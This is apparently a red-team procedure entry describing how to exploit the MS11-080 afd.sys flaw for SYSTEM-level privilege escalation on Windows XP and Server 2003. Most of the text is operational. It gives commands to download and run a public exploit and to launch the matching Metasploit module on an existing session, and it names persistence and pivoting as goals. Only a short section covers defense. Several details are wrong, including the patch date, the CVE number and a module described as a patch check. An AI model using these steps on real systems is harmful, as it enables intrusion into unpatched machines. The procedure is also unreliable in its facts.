---
id: b1d886e8-59eb-494b-85ce-227135b7797e
name: MS11-080-AFD-JoinLeaf-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.445225+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
sub_techniques: []
tags:
  - EoP - Common Vulnerabilities and Exposure
  - MS11-080 (afd.sys) - Microsoft Windows XP/2003
  - Windows - Privilege Escalation
commands:
  - '[[commands/download-python-exploit-ms11-080]]'
  - '[[commands/run-ms11-080-python-exploit]]'
  - '[[commands/msfconsole-launch]]'
  - '[[commands/msf-execute-ms11-080-module]]'
platforms:
  - Windows XP
  - Windows Server 2003
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# MS11-080-AFD-JoinLeaf-Privilege-Escalation

## Summary

This procedure exploits the MS11-080 vulnerability in the Windows kernel-mode driver afd.sys to achieve local privilege escalation on unpatched Microsoft Windows XP and Windows Server 2003 systems. By sending specially crafted IOCTL requests to the Ancillary Function Driver (AFD), an attacker with low-privileged code execution can elevate to SYSTEM privileges, enabling full control over the target system.

## Description

MS11-080 (CVE-2011-1249) is a kernel vulnerability affecting how afd.sys handles IOCTL code 0x120007 with the JoinLeaf sub-function in the AFD driver. This flaw allows arbitrary kernel code execution due to improper validation of user-mode pointers, leading to privilege escalation. The exploit requires initial low-privilege access (e.g., via a limited user account or initial foothold) but no network access. It is suitable for post-exploitation in red team engagements targeting legacy Windows environments. Successful exploitation typically spawns a command shell running as NT AUTHORITY\SYSTEM without crashing the system in most cases. Note that this vulnerability was patched in April 2011, so it only affects unpatched systems.

## Requirements

1. Low-privilege code execution on the target (e.g., limited user account or initial shell).
2. Target running unpatched Windows XP SP3 or Windows Server 2003 (32-bit).
3. Python 2.x installed on the target for the standalone exploit, or Metasploit Framework accessible from the attacker's machine with an existing session.
4. Administrative privileges not required initially, but the exploit will attempt to gain them.

## Defense

- Apply Microsoft security bulletin MS11-080 patch immediately on affected systems.
- Use host-based intrusion detection systems (HIDS) like Sysmon to monitor for suspicious IOCTL calls or process creations from afd.sys interactions.
- Implement least privilege principles, restricting code execution to non-admin users and using application whitelisting (e.g., AppLocker).
- Regularly audit kernel driver loads and monitor for anomalous privilege changes via event logs (Event ID 4672/4673).

## Objectives

1. Escalate from low privileges to SYSTEM on the target Windows system.
2. Gain full control to access sensitive data, install persistence, or pivot further.
3. Verify elevation without system instability.

## Instructions

### Step 1: Download the Python Exploit

**Context**: Obtain the standalone Python exploit code from Exploit-DB, which implements the AFD JoinLeaf IOCTL manipulation to trigger the vulnerability and spawn an elevated shell. This step assumes you have a way to transfer files to the target (e.g., via SMB or initial access tool).

**Command** ([[commands/download-python-exploit-ms11-080]]):
```bash
wget https://www.exploit-db.com/download/18176 -O ms11-080.py
```

> This downloads the exploit script to the current directory. Verify the file integrity by checking its size (approximately 5KB) and ensuring it starts with Python shebang. Transfer it to the target if downloaded on attacker machine.

### Step 2: Execute the Python Exploit

**Context**: Run the downloaded script on the target system to send the malicious IOCTL request via the AFD device, exploiting the pointer validation flaw to overwrite kernel structures and elevate privileges. The script uses Windows API calls (via ctypes) to interact with the driver and spawns cmd.exe as SYSTEM upon success.

**Command** ([[commands/run-ms11-080-python-exploit]]):
```python
python ms11-080.py
```

> Execute in a low-priv shell. The script performs the exploitation atomically to avoid BSOD. If successful, it will output a message like "Exploit successful!" and drop into an elevated cmd prompt. Verify with `whoami` showing `nt authority\system`.

### Step 3: Launch Metasploit Console (Alternative Path)

**Context**: If preferring a framework-based approach, start Metasploit to load the MS11-080 module. This requires an existing Meterpreter session on the target (e.g., from initial access). Metasploit handles the exploitation reliably with built-in error checking.

**Command** ([[commands/msfconsole-launch]]):
```bash
msfconsole
```

> This launches the interactive console. Wait for the msf6 > prompt. Ensure Metasploit is updated (`msfupdate`) to have the latest module.

### Step 4: Execute Metasploit MS11-080 Module (Alternative Path)

**Context**: Load and configure the ms11_080_afdjoinleaf module within Metasploit, setting the existing session ID to background the exploitation against the vulnerable driver. The module sends the crafted IOCTL and migrates to a new process if needed for stability.

**Command** ([[commands/msf-execute-ms11-080-module]]):
```ruby
use exploit/windows/local/ms11_080_afdjoinleaf
set SESSION 1
exploit
```

> Replace SESSION 1 with your actual session ID (use `sessions -l` to list). The module will run the exploit, and upon success, you'll get an elevated Meterpreter shell. Check with `getuid` showing NT AUTHORITY\SYSTEM. If it fails, check for patch status with `post/windows/gather/checkvm` or similar.
